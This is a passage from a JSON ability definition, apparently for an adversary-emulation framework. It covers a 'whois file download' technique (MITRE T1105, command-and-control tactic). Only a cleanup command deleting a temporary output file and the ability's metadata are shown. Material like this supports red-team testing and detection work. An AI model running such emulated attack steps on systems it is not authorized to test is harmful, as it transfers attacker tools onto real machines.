                    "rm -f /tmp/T1105.whois.out"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "whois file download",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "253e8dc2d0195de95eae8e9ec7e350a9",
        "technique_id": "T1105",
        "repeatable": false
    }
]